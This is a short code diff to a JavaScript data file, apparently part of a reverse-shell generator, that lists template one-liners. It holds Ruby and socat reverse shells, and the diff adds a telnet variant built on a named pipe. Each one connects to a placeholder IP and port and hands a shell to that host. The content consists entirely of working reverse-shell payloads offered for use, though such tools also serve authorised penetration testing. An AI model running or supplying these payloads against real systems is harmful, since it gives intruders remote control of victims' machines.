@@ -28,7 +28,8 @@ const rsgData = {
         ['Ruby #1', 'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/{shell} -i <&%d >&%d 2>&%d",f,f,f)\''],
         ['Ruby #2', 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''],
         ['socat #1', 'socat TCP:{ip}:{port} EXEC:{shell}'],
-        ['socat #2 (TTY)', 'socat TCP:{ip}:{port} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane']
+        ['socat #2 (TTY)', 'socat TCP:{ip}:{port} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane'],
+        ['telnet', 'mknod a p && telnet {ip} {port} 0<a | /bin/{shell} 1>a']
     ],
 
     specialCommands: {
